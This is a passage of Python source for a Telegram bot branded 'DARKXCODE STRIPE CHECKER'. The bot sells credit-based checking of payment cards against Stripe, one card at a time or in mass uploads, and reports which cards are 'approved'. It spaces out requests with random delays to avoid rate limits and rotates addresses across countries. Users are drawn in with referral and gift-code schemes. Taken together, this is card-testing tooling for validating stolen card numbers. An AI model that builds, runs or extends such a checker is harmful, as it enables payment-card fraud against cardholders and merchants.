            "You don't have any ongoing mass check.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    if checking_tasks[user_id]["cancelled"]:
        await update.message.reply_text(
            "*ℹ️ ALREADY CANCELLED*\n"
            "Your mass check is already being cancelled.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    checking_tasks[user_id]["cancelled"] = True
    
    await update.message.reply_text(
        "*🛑 CANCELLATION REQUESTED*\n"
        "Your mass check will be cancelled shortly.\n"
        "You'll receive a summary when it's complete.",
        parse_mode=ParseMode.MARKDOWN
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /help command"""
    # Get user ID from either message or callback query
    if update.message:
        user_id = update.effective_user.id
        user_name = update.effective_user.first_name or "User"
    elif update.callback_query:
        user_id = update.callback_query.from_user.id
        user_name = update.callback_query.from_user.first_name or "User"
    else:
        return
    
    # Get user data
    user = await get_user(user_id)
    
    # Different help for admin vs regular users
    if user_id in ADMIN_IDS:
        help_text = f"""<b>⚡ DARKXCODE STRIPE CHECKER ⚡</b>
══════════════════════
👋 <b>Welcome, {escape_markdown_v2(user_name)}!</b>

<b>Account Overview:</b>
• Credits: <b>{user.get('credits', 0)}</b>
• Today: ✅{user.get('approved_cards', 0)} ❌{user.get('declined_cards', 0)}
• Total Checks: <b>{user.get('total_checks', 0)}</b>

<b>User Commands:</b>
• <code>/chk cc|mm|yy|cvv</code> - Check Single Card
• <code>/mchk</code> - Upload File For Mass Check
• <code>/credits</code> - Check Credits
• <code>/claim CODE</code> - Redeem Gift Code
• <code>/info</code> - Bot Information
• <code>/invite</code> - Invite Friends & Earn Credits
• <code>/cancel</code> - Cancel Mass Check
• <code>/help</code> - See All Commands

<b>Admin Commands:</b>
• <code>/addcr user_id amount</code> - Add Credits
• <code>/gengift credits max_uses</code> - Create Gift Code
• <code>/listgifts</code> - List All Gift Codes
• <code>/userinfo user_id</code> - View User Info
• <code>/botinfo</code> - Bot Statistics

<b>Owner:</b> 👑 @ISHANT_OFFICIAL
══════════════════════
"""
    else:
        help_text = f"""<b>⚡ DARKXCODE STRIPE CHECKER ⚡</b>
══════════════════════
👋 <b>Welcome, {escape_markdown_v2(user_name)}!</b>

<b>Account Overview:</b>
• Credits: <b>{user.get('credits', 0)}</b>
• Today: ✅{user.get('approved_cards', 0)} ❌{user.get('declined_cards', 0)}
• Total Checks: <b>{user.get('total_checks', 0)}</b>

<b>User Commands:</b>
• <code>/chk cc|mm|yy|cvv</code> - Check Single Card
• <code>/mchk</code> - Upload File For Mass Check
• <code>/credits</code> - Check Credits
• <code>/claim CODE</code> - Redeem Gift Code
• <code>/info</code> - Bot Information
• <code>/invite</code> - Invite Friends & Earn Credits
• <code>/cancel</code> - Cancel Mass Check
• <code>/help</code> - See All Commands

<b>Owner:</b> 👑 @ISHANT_OFFICIAL
══════════════════════
"""
    
    # Send the message using HTML parsing
    try:
        if update.message:
            await update.message.reply_text(
                help_text, 
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]])
            )
        elif update.callback_query:
            await update.callback_query.edit_message_text(
                help_text, 
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]])
            )
    except Exception as e:
        logger.error(f"Error in help command: {e}")
        # Fallback to plain text
        if update.message:
            await update.message.reply_text(
                help_text.replace('<b>', '').replace('</b>', '').replace('<code>', '').replace('</code>', ''),
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]])
            )
        elif update.callback_query:
            await update.callback_query.edit_message_text(
                help_text.replace('<b>', '').replace('</b>', '').replace('<code>', '').replace('</code>', ''),
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]])
            )

async def verify_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle verify join callback"""
    query = update.callback_query
    
    try:
        await query.answer()
    except BadRequest:
        pass
    
    user_id = query.from_user.id
    await update_user(user_id, {'joined_channel': True})
    
    await query.edit_message_text(
        "*✅ ACCESS GRANTED*\n"
        "══════════════════════\n"
        "Channel membership verified successfully!\n"
        "You now have full access to all features.\n\n"
        "Use `/help` to see available commands.",
        parse_mode=ParseMode.MARKDOWN
    )

async def claim_gift_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle claim gift callback"""
    query = update.callback_query
    
    try:
        await query.answer("Use /claim CODE to redeem gift code")
    except BadRequest:
        pass
    
    await query.edit_message_text(
        "*💰 CLAIM GIFT CODE*\n"
        "══════════════════════\n"
        "To claim a gift code, use:\n"
        "`/claim CODE`\n\n"
        "*Example:*\n"
        "`/claim ABC123XYZ456DEF7`\n\n"
        "*Note:* Each code can be claimed only once per user.\n"
        "Ask admin for gift codes or wait for announcements.",
        parse_mode=ParseMode.MARKDOWN
    )

async def userinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /userinfo command - Admin view user info"""
    if update.message:
        user_id = update.effective_user.id
        message = update.message
    else:
        return
    
    if user_id not in ADMIN_IDS:
        await message.reply_text(
            "❌ This command is for administrators only.",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not context.args:
        await message.reply_text(
            "<b>❌ Usage:</b> <code>/userinfo user_id</code>\n"
            "<b>Example:</b> <code>/userinfo 123456789</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    try:
        target_user_id = int(context.args[0])
        user = await get_user(target_user_id)
        
        # Get claimed codes from Firebase
        claimed_codes = []
        db_connection = get_db()
        if db_connection:
            try:
                claimed_ref = db_connection.collection('user_claimed_codes')
                claimed_docs = claimed_ref.where('user_id', '==', target_user_id).stream()
                
                for doc in claimed_docs:
                    data = doc.to_dict()
                    if 'code' in data:
                        claimed_codes.append(data['code'])
            except Exception as e:
                logger.error(f"Error fetching claimed codes: {e}")
        
        # Calculate success rate
        total_user_checks = user.get('total_checks', 0)
        approved_cards = user.get('approved_cards', 0)
        success_rate = (approved_cards / total_user_checks * 100) if total_user_checks > 0 else 0
        
        # Get referrer info if exists
        referrer_info = ""
        if user.get('referrer_id'):
            referrer = await get_user(user['referrer_id'])
            referrer_name = referrer.get('username', 'N/A')
            referrer_info = f"\n<b>Referred by:</b> @{referrer_name} ({user['referrer_id']})"
        
        # Format dates
        joined_date = user.get('joined_date', 'N/A')
        if isinstance(joined_date, datetime.datetime):
            joined_date = joined_date.strftime('%Y-%m-%d')
        elif isinstance(joined_date, str) and len(joined_date) >= 10:
            joined_date = joined_date[:10]
        
        last_active = user.get('last_active', 'Never')
        if isinstance(last_active, datetime.datetime):
            last_active = last_active.strftime('%Y-%m-%d %H:%M:%S')
        elif isinstance(last_active, str) and len(last_active) >= 19:
            last_active = last_active[:19]
        
        user_info = f"""<b>👤 USER INFO (ADMIN)</b>
══════════════════════
<b>User ID:</b> <code>{target_user_id}</code>
<b>Username:</b> @{user.get('username', 'N/A')}
<b>Name:</b> {user.get('first_name', 'N/A')}
<b>Joined:</b> {joined_date}
<b>Channel:</b> {'✅ Joined' if user.get('joined_channel', False) else '❌ Not Joined'}
<b>Last Active:</b> {last_active}
{referrer_info}

<b>Credits:</b> {user.get('credits', 0)}
<b>Credits Spent:</b> {user.get('credits_spent', 0)}

<b>Statistics:</b>
• Total Checks: {total_user_checks}
• Today's Checks: {user.get('checks_today', 0)}
• ✅ Approved: {approved_cards}
• ❌ Declined: {user.get('declined_cards', 0)}
• Success Rate: {success_rate:.1f}%

<b>Referrals:</b> {user.get('referrals_count', 0)} users
<b>Earned from Referrals:</b> {user.get('earned_from_referrals', 0)} credits

<b>Claimed Codes:</b> {len(claimed_codes)}
══════════════════════
"""
        if claimed_codes:
            user_info += "\n<b>Claimed Gift Codes:</b>\n"
            for code in claimed_codes[:10]:
                user_info += f"• <code>{code}</code>\n"
            if len(claimed_codes) > 10:
                user_info += f"• ... and {len(claimed_codes) - 10} more\n"
        
        await message.reply_text(user_info, parse_mode=ParseMode.HTML)
        
    except ValueError:
        await message.reply_text("❌ Invalid user ID.", parse_mode=ParseMode.HTML)
    except Exception as e:
        logger.error(f"Error in userinfo_command: {e}")
        await message.reply_text("❌ An error occurred while fetching user info.", parse_mode=ParseMode.HTML)

async def botinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /botinfo command - Shows bot statistics (admin only)"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text(
            "❌ This command is for administrators only.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    stats = await get_bot_stats()
    
    # Calculate bot uptime
    start_time = stats["start_time"]
    if isinstance(start_time, str):
        # Handle string format
        try:
            if 'Z' in start_time:
                start_time = datetime.datetime.fromisoformat(start_time.replace('Z', '+00:00'))
            else:
                start_time = datetime.datetime.fromisoformat(start_time)
        except:
            start_time = datetime.datetime.now()
    elif isinstance(start_time, datetime.datetime):
        # Already a datetime object
        pass
    else:
        start_time = datetime.datetime.now()
    
    # Make both datetimes timezone-aware or naive
    now = datetime.datetime.now()
    if start_time.tzinfo is not None and now.tzinfo is None:
        now = now.replace(tzinfo=datetime.timezone.utc)
    elif start_time.tzinfo is None and now.tzinfo is not None:
        start_time = start_time.replace(tzinfo=datetime.timezone.utc)
    
    uptime = now - start_time
    days = uptime.days
    hours = uptime.seconds // 3600
    minutes = (uptime.seconds % 3600) // 60
    
    # Calculate success rate
    total_checks = stats.get("total_checks", 0)
    total_approved = stats.get("total_approved", 0)
    success_rate = (total_approved / total_checks * 100) if total_checks > 0 else 0
    
    # Calculate average credits per user
    total_users = stats.get("total_users", 1)
    total_credits_used = stats.get("total_credits_used", 0)
    avg_credits = total_credits_used / total_users if total_users > 0 else 0
    
    # Get gift codes count from Firebase
    total_gift_codes = 0
    db = get_db()
    if db:
        try:
            codes_ref = db.collection('gift_codes')
            codes_docs = codes_ref.get()
            total_gift_codes = len(codes_docs)
        except Exception as e:
            logger.error(f"Error counting gift codes: {e}")
    else:
        total_gift_codes = len(in_memory_gift_codes)
    
    # Format start time for display
    if isinstance(start_time, datetime.datetime):
        start_time_str = start_time.strftime('%Y-%m-%d %H:%M:%S')
    else:
        start_time_str = str(start_time)
    
    await update.message.reply_text(
        f"*📊 BOT STATISTICS (ADMIN)*\n"
        f"══════════════════════\n"
        f"*Uptime:* {days}d {hours}h {minutes}m\n"
        f"*Started:* {start_time_str}\n\n"
        f"*User Statistics:*\n"
        f"• Total Users: {stats.get('total_users', 0)}\n"
        f"• Active Today: {stats.get('total_users', 0)} (using in-memory storage)\n\n"
        f"*Card Checking Stats:*\n"
        f"• Total Checks: {total_checks}\n"
        f"• ✅ Approved: {total_approved}\n"
        f"• ❌ Declined: {stats.get('total_declined', 0)}\n"
        f"• Success Rate: {success_rate:.1f}%\n\n"
        f"*Credit Statistics:*\n"
        f"• Total Credits Used: {total_credits_used}\n"
        f"• Avg Credits/User: {avg_credits:.1f}\n"
        f"• Active Gift Codes: {total_gift_codes}\n\n"
        f"*System Status:*\n"
        f"• Active Checks: {len(checking_tasks)}\n"
        f"• Storage: {'✅ Firebase' if firebase_connected else '⚠️ In-memory'}",
        parse_mode=ParseMode.MARKDOWN
    )

# ==================== MASS CHECK FUNCTIONS ====================

async def start_mass_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start mass check from callback - ULTRA FAST with rotation"""
    query = update.callback_query
    
    try:
        await query.answer()
    except BadRequest:
        pass
    
    user_id = query.from_user.id
    
    if user_id not in files_storage or "cards" not in files_storage[user_id]:
        await query.edit_message_text("❌ No cards found. Please upload file again.")
        return
    
    cards = files_storage[user_id]["cards"]
    user = await get_user(user_id)
    
    # Check if user has enough credits
    if user["credits"] < len(cards):
        await query.edit_message_text(
            f"*💰 INSUFFICIENT CREDITS*\n"
            f"══════════════════════\n"
            f"*Cards to check:* {len(cards)}\n"
            f"*Credits needed:* {len(cards)}\n"
            f"*Your credits:* {user['credits']}\n\n"
            f"You need {len(cards) - user['credits']} more credits.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Create cancel button
    keyboard = [[InlineKeyboardButton("🛑 CANCEL CHECK", callback_data=f"cancel_check_{user_id}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    status_msg = await query.edit_message_text(
        f"*🚀 MASS CHECK STARTED*\n"
        f"══════════════════════\n"
        f"*Total Cards:* {len(cards)}\n"
        f"*Your Credits:* {user['credits']}\n"
        f"*Status:* ⚡ Processing Cards...\n\n"
        f"*Live Results:* Starting...\n"
        f"══════════════════════\n"
        f"✅ Approved: 0\n"
        f"❌ Declined: 0\n"
        f"⏳ Processed: 0/{len(cards)}",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )
    
    # Store task
    task = asyncio.create_task(mass_check_task_ultrafast(user_id, cards, status_msg, query.message.chat_id, context))
    checking_tasks[user_id] = {
        "task": task, 
        "cancelled": False,
        "cards_processed": 0,
        "total_cards": len(cards),
        "chat_id": query.message.chat_id,
        "message_id": query.message.message_id,
        "start_time": time.time(),
        "approved": 0,
        "declined": 0
    }
    
    # Cleanup file storage
    if user_id in files_storage:
        del files_storage[user_id]

async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id, context):
    """ULTRA-FAST mass checking with rotation and live results"""
    processed = 0
    approved = 0
    declined = 0
    credits_used = 0  # Track actual credits used
    user = await get_user(user_id)
    
    # Calculate initial credits
    initial_credits = user.get("credits", 0)
    
    # Create session for reuse
    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=30)
    
    try:
        session = aiohttp.ClientSession(connector=connector, timeout=timeout)
        
        # Process cards one by one with delays to avoid rate limits
        for i, card in enumerate(cards):
            # Check if cancelled
            if user_id in checking_tasks and checking_tasks[user_id]["cancelled"]:
                break
            
            # Update status every 5 cards
            if i % 5 == 0 or i == len(cards) - 1:
                elapsed = time.time() - checking_tasks[user_id]["start_time"]
                cards_per_second = processed / elapsed if elapsed > 0 else 0
                progress = (processed / len(cards)) * 100
                
                try:
                    await status_msg.edit_text(
                        f"<b>🚀 MASS CHECK IN PROGRESS</b>\n"
                        f"══════════════════════\n"
                        f"<b>Total Cards:</b> {len(cards)}\n"
                        f"<b>Credits Used:</b> {credits_used}\n"
                        f"<b>Status:</b> {progress:.1f}%\n\n"
                        f"<b>Live Results:</b>\n"
                        f"══════════════════════\n"
                        f"✅ Approved: {approved}\n"
                        f"❌ Declined: {declined}\n"
                        f"⏳ Processed: {processed}/{len(cards)}",
                        parse_mode=ParseMode.HTML
                    )
                except Exception:
                    pass
            
            # Check single card using your existing function
            result_card, status, message, http_code = await check_single_card_fast(card)
            
            processed += 1
            
            # Update task data
            if user_id in checking_tasks:
                checking_tasks[user_id]["cards_processed"] = processed
            
            # Define which messages are actual card declines
            actual_decline_keywords = [
                'card', 'declined', 'insufficient', 'invalid', 'incorrect', 
                'expired', 'stolen', 'lost', 'fraud', 'limit', 'balance'
            ]
            
            error_keywords = [
                'setup error', 'timeout', 'http error', 'network error', 
                'connection error', 'server error', 'internal error',
                'invalid response', 'no payment id', 'ajax error', 'stripe timeout'
            ]
            
            message_lower = message.lower() if message else ""
            is_actual_decline = any(keyword in message_lower for keyword in actual_decline_keywords)
            is_error = any(keyword in message_lower for keyword in error_keywords)
            
            if status == "approved":
                approved += 1
                credits_used += 1  # Deduct credit for approved
                if user_id in checking_tasks:
                    checking_tasks[user_id]["approved"] = approved
                
                # Send approved result
                try:
                    # Get updated user info for the result
                    current_user = await get_user(user_id)
                    result_text = format_card_result(
                        result_card, 
                        status, 
                        message,
                        current_user.get("credits", 0),
                        {
                            "approved": approved,
                            "declined": declined,
                            "total_approved": current_user.get("approved_cards", 0),
                            "total_declined": current_user.get("declined_cards", 0)
                        }
                    )
                    await context.bot.send_message(
                        chat_id=chat_id,
                        text=result_text,
                        parse_mode=ParseMode.HTML
                    )
                except Exception as e:
                    logger.error(f"Error sending approved result: {e}")
                    
            elif status == "declined" and is_actual_decline and not is_error:
                declined += 1
                credits_used += 1  # Deduct credit for actual decline
                if user_id in checking_tasks:
                    checking_tasks[user_id]["declined"] = declined
            else:
                # This was an error - don't count as decline for credit deduction
                declined += 1
                if user_id in checking_tasks:
                    checking_tasks[user_id]["declined"] = declined
            
            # Small delay to avoid rate limiting (tuned for speed)
            if i < len(cards) - 1:
                delay = random.uniform(0.5, 1.5)
                await asyncio.sleep(delay)
        
        # Close session
        await session.close()
        
    except Exception as e:
        logger.error(f"Error in mass check: {e}")
    
    # Final update after all cards processed
    elapsed = time.time() - checking_tasks[user_id]["start_time"]
    success_rate = (approved / len(cards) * 100) if cards else 0
    
    # Update user data with actual credits used
    updates = {
        'credits': initial_credits - credits_used,
        'credits_spent': user.get("credits_spent", 0) + credits_used,
        'checks_today': user.get("checks_today", 0) + processed,
        'total_checks': user.get("total_checks", 0) + processed,
        'approved_cards': user.get("approved_cards", 0) + approved,
        'declined_cards': user.get("declined_cards", 0) + declined,
        'last_check_date': datetime.datetime.now().date().isoformat()  # String date
    }
    await update_user(user_id, updates)
    
    # Update bot statistics with actual credits used
    await update_bot_stats({
        'total_checks': processed,
        'total_credits_used': credits_used,
        'total_approved': approved,
        'total_declined': declined
    })
    
    # Refresh user data
    user = await get_user(user_id)
    
    # Send summary
    summary_text = f"""<b>🎯 MASS CHECK COMPLETE</b>
══════════════════════
<b>Statistics:</b>
• Total Cards: {len(cards)}
• ✅ Approved: {approved}
• ❌ Declined: {declined}
• Credits Used: {credits_used} (only for actual checks)
• Time Taken: {elapsed:.1f}s
• Success Rate: {success_rate:.1f}%

<b>Your Balance:</b> {user.get('credits', 0)} credits
══════════════════════
"""
    
    try:
        await status_msg.edit_text(summary_text, parse_mode=ParseMode.HTML)
    except Exception:
        pass
    
    # Cleanup
    if user_id in checking_tasks:
        del checking_tasks[user_id]

async def cancel_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle cancel check button"""
    query = update.callback_query
    
    try:
        await query.answer()
    except BadRequest:
        pass
    
    if query.data.startswith("cancel_check_"):
        try:
            user_id = int(query.data.split("_")[2])
        except:
            try:
                await query.answer("Invalid request", show_alert=True)
            except:
                pass
            return
        
        if user_id in checking_tasks:
            checking_tasks[user_id]["cancelled"] = True
            
            # Calculate used credits based on actual processing
            processed = checking_tasks[user_id]["cards_processed"]
            approved = checking_tasks[user_id].get("approved", 0)
            declined = checking_tasks[user_id].get("declined", 0)
            
            user = await get_user(user_id)
            used_credits = approved + declined  # Only actual checks count
            
            # Update user credits
            updates = {
                'credits': user["credits"] - used_credits,
                'credits_spent': user.get("credits_spent", 0) + used_credits,
                'checks_today': user.get("checks_today", 0) + processed,
                'total_checks': user["total_checks"] + processed,
                'approved_cards': user.get("approved_cards", 0) + approved,
                'declined_cards': user.get("declined_cards", 0) + declined,
                'last_check_date': datetime.datetime.now().date().isoformat()
            }
            await update_user(user_id, updates)
            
            # Update bot statistics
            await update_bot_stats({
                'total_checks': processed,
                'total_credits_used': used_credits,
                'total_approved': approved,
                'total_declined': declined
            })
            
            # Refresh user data
            user = await get_user(user_id)
            
            success_rate = (approved / processed * 100) if processed > 0 else 0
            
            await query.edit_message_text(
                f"*🛑 CHECK CANCELLED*\n"
                f"══════════════════════\n"
                f"*Results:*\n"
                f"• Processed: {processed} cards\n"
                f"• ✅ Approved: {approved}\n"
                f"• ❌ Declined: {declined}\n"
                f"• Credits Used: {used_credits}\n"
                f"• Success Rate: {success_rate:.1f}%\n\n"
                f"*New Balance:* {user['credits']} credits",
                parse_mode=ParseMode.MARKDOWN
            )
            
            if user_id in checking_tasks:
                del checking_tasks[user_id]
        else:
            try:
                await query.answer("No active check found", show_alert=True)
            except:
                pass

async def handle_file_upload_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle file upload messages"""
    if not update.message.document:
        return
    
    user_id = update.effective_user.id
    file = update.message.document
    
    # Check if file is TXT
    if not file.file_name.lower().endswith('.txt'):
        await update.message.reply_text(
            "❌ Please upload only .txt files",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Store file info temporarily
    file_id = file.file_id
    files_storage[user_id] = {
        "file_id": file_id,
        "file_name": file.file_name,
        "timestamp": datetime.datetime.now().isoformat(),
        "message_id": update.message.message_id
    }
    
    await update.message.reply_text(
        f"*📁 FILE RECEIVED*\n"
        f"══════════════════════\n"
        f"*File:* `{file.file_name}`\n\n"
        f"To start mass check, use:\n"
        "`/mchk`\n\n"
        f"*Note:* Each card will use 1 credit.",
        parse_mode=ParseMode.MARKDOWN
    )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors gracefully"""
    error_msg = str(context.error) if context.error else "Unknown error"
    logger.error(f"Exception: {error_msg}")
    
    # Ignore common non-critical errors
    if "Message is not modified" in error_msg:
        return
    if "Query is too old" in error_msg:
        return
    
    try:
        if update and update.effective_message:
            await update.effective_message.reply_text(
                "*⚠️ SYSTEM ERROR*\n"
                "An error occurred. Please try again.\n"
                "If problem persists, contact admin.",
                parse_mode=ParseMode.MARKDOWN
            )
    except Exception as e:
        logger.error(f"Error in error handler: {e}")

async def unknown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle unknown commands"""
    await update.message.reply_text(
        "*❌ Invalid Command*\n\n"
        "Use `/help` to see available commands.",
        parse_mode=ParseMode.MARKDOWN
    )

class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>⚡ DARKXCODE STRIPE CHECKER ⚡</title>
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <style>
                    body {
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                        color: white;
                        text-align: center;
                        padding: 50px;
                        margin: 0;
                        min-height: 100vh;
                        display: flex;
                        flex-direction: column;
                        justify-content: center;
                        align-items: center;
                    }
                    .container {
                        background: rgba(0, 0, 0, 0.7);
                        padding: 40px;
                        border-radius: 20px;
                        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
                        max-width: 800px;
                        width: 90%;
                        backdrop-filter: blur(10px);
                    }
                    h1 {
                        font-size: 2.5em;
                        margin-bottom: 20px;
                        color: #00ff88;
                        text-shadow: 0 0 10px #00ff88;
                    }
                    .status {
                        font-size: 1.5em;
                        margin: 20px 0;
                        padding: 15px;
                        background: rgba(0, 255, 136, 0.1);
                        border-radius: 10px;
                        border: 2px solid #00ff88;
                    }
                    .info-box {
                        background: rgba(255, 255, 255, 0.1);
                        padding: 20px;
                        border-radius: 10px;
                        margin: 15px 0;
                        text-align: left;
                    }
                    .stats {
                        display: grid;
                        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                        gap: 15px;
                        margin: 20px 0;
                    }
                    .stat-box {
                        background: rgba(255, 255, 255, 0.1);
                        padding: 15px;
                        border-radius: 10px;
                    }
                    .glow {
                        animation: glow 2s ease-in-out infinite alternate;
                    }
                    @keyframes glow {
                        from { text-shadow: 0 0 5px #fff, 0 0 10px #00ff88; }
                        to { text-shadow: 0 0 10px #fff, 0 0 20px #00ff88, 0 0 30px #00ff88; }
                    }
                    .telegram-btn {
                        display: inline-block;
                        background: #0088cc;
                        color: white;
                        padding: 15px 30px;
                        border-radius: 25px;
                        text-decoration: none;
                        font-weight: bold;
                        margin-top: 20px;
                        transition: all 0.3s;
                    }
                    .telegram-btn:hover {
                        background: #006699;
                        transform: scale(1.05);
                    }
                    footer {
                        margin-top: 30px;
                        color: rgba(255, 255, 255, 0.7);
                        font-size: 0.9em;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1 class="glow">⚡ DARKXCODE STRIPE CHECKER ⚡</h1>
                    
                    <div class="status">✅ BOT IS ONLINE & RUNNING</div>
                    
                    <div class="info-box">
                        <h3>🤖 Bot Information</h3>
                        <p><strong>Version:</strong> v4.0</p>
                        <p><strong>Status:</strong> Active 24/7</p>
                        <p><strong>Features:</strong> Ultra-fast card checking with real-time results</p>
                    </div>
                    
                    <div class="stats">
                        <div class="stat-box">
                            <h4>⚡ Speed</h4>
                            <p>5 cards/second</p>
                        </div>
                        <div class="stat-box">
                            <h4>📍 Rotation</h4>
                            <p>US, UK, CA, IN, AU</p>
                        </div>
                        <div class="stat-box">
                            <h4>🤝 Referral</h4>
                            <p>100 credits each</p>
                        </div>
                        <div class="stat-box">
                            <h4>🛡️ Security</h4>
                            <p>Encrypted & Secure</p>
                        </div>
                    </div>
                    
                    <div class="info-box">
                        <h3>🚀 Bot Features</h3>
                        <ul style="text-align: left;">
                            <li>• Ultra-Fast Single Card Check</li>
                            <li>• Mass Check with Live Results</li>
                            <li>• Gift Code System</li>
                            <li>• Advanced Admin Panel</li>
                            <li>• Real-time Statistics</li>
                            <li>• Invite & Earn System</li>
                        </ul>
                    </div>
                    
                    <a href="https://t.me/DarkXCode" class="telegram-btn" target="_blank">
                        📲 Contact on Telegram
                    </a>
                    
                    <footer>
                        <p>© 2024 DARKXCODE STRIPE CHECKER | Version 4.0</p>
                        <p>Service Status: <span style="color: #00ff88;">●</span> Operational</p>
                    </footer>
                </div>
                
                <script>
                    // Update time every second
                    function updateTime() {
                        const now = new Date();
                        document.getElementById('current-time').textContent = 
                            now.toLocaleTimeString() + ' ' + now.toLocaleDateString();
                    }
                    setInterval(updateTime, 1000);
                    updateTime();
                </script>
            </body>
            </html>
            """
            self.wfile.write(html.encode())
        elif self.path == '/health':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            response = {
                "status": "online",
                "service": "darkxcode-stripe-checker",
                "version": "4.0",
                "timestamp": datetime.datetime.now().isoformat()
            }
            self.wfile.write(json.dumps(response).encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        # Disable logging for health checks
        pass

def start_health_server(port=8080):
    """Start a simple HTTP server for health checks"""
    server = HTTPServer(('0.0.0.0', port), HealthHandler)
    print(f"🌐 Health server started on port {port}")
    print(f"🔗 Web interface: http://localhost:{port}")
    print(f"🔗 Health check: http://localhost:{port}/health")
    server.serve_forever()

async def main():
    """Start the bot"""
    print(f"🤖 {BOT_INFO['name']} v{BOT_INFO['version']}")
    
    if not firebase_connected:
        print("⚠️  Using in-memory storage instead")
        print("⚠️  NOTE: Data will be lost when bot restarts!")
    else:
        print("✅ Firebase connected successfully")
    
    # Start health server in a separate thread
    health_port = int(os.environ.get('PORT', 8080))
    health_thread = threading.Thread(target=start_health_server, args=(health_port,), daemon=True)
    health_thread.start()
    
    # Create application with Pydroid-compatible settings
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add error handler
    application.add_error_handler(error_handler)
    
    # ========== COMMAND HANDLERS ==========
    # Public commands
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("info", info_command))
    application.add_handler(CommandHandler("credits", credits_command))
    application.add_handler(CommandHandler("invite", invite_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("mchk", mchk_command))
    application.add_handler(CommandHandler("claim", claim_command))
    application.add_handler(CommandHandler("cancel", cancel_command))
    application.add_handler(CommandHandler("help", help_command))
    
    # Admin commands
    application.add_handler(CommandHandler("botinfo", botinfo_command))
    application.add_handler(CommandHandler("userinfo", userinfo_command))
    application.add_handler(CommandHandler("addcr", addcr_command))
    application.add_handler(CommandHandler("gengift", gengift_command))
    application.add_handler(CommandHandler("listgifts", listgifts_command))
    
    # ========== MESSAGE HANDLERS ==========
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file_upload_message))
    
    # ========== CALLBACK HANDLERS ==========
    application.add_handler(CallbackQueryHandler(verify_join_callback, pattern="^verify_join$"))
    application.add_handler(CallbackQueryHandler(back_to_start_callback, pattern="^back_to_start$"))
    application.add_handler(CallbackQueryHandler(quick_check_callback, pattern="^quick_check$"))
    application.add_handler(CallbackQueryHandler(mass_check_callback, pattern="^mass_check$"))
    application.add_handler(CallbackQueryHandler(my_credits_callback, pattern="^my_credits$"))
    application.add_handler(CallbackQueryHandler(invite_callback, pattern="^invite$"))
    application.add_handler(CallbackQueryHandler(copy_invite_callback, pattern="^copy_invite$"))
    application.add_handler(CallbackQueryHandler(admin_panel_callback, pattern="^admin_panel$"))
    application.add_handler(CallbackQueryHandler(claim_gift_callback, pattern="^claim_gift$"))
    application.add_handler(CallbackQueryHandler(start_mass_check_callback, pattern="^start_mass_"))
    application.add_handler(CallbackQueryHandler(cancel_check_callback, pattern="^cancel_check_"))
    application.add_handler(CallbackQueryHandler(cancel_check_callback, pattern="^cancel_mass$"))
    
    # Admin panel callbacks
    application.add_handler(CallbackQueryHandler(admin_addcr_callback, pattern="^admin_addcr$"))
    application.add_handler(CallbackQueryHandler(admin_gengift_callback, pattern="^admin_gengift$"))
    application.add_handler(CallbackQueryHandler(admin_listgifts_callback, pattern="^admin_listgifts$"))
    application.add_handler(CallbackQueryHandler(admin_userinfo_callback, pattern="^admin_userinfo$"))
    application.add_handler(CallbackQueryHandler(admin_botinfo_callback, pattern="^admin_botinfo$"))
    
    # ========== UNKNOWN COMMAND HANDLER ==========
    # Must be added LAST to catch all other commands
    application.add_handler(MessageHandler(filters.COMMAND, unknown_command))
    
    # Start bot with Pydroid-compatible settings
    print(f"📍 Address Rotation: Enabled (US, UK, CA, IN, AU)")
    print(f"🤝 Invite & Earn: 100 credits per referral")
    print(f"📊 Database: ✅ Connected")
    print(f"🔐 Admin Commands: {len(ADMIN_IDS)} admin(s)")
    print("✅ Bot is running...")
    
    # Start polling with Pydroid-compatible settings
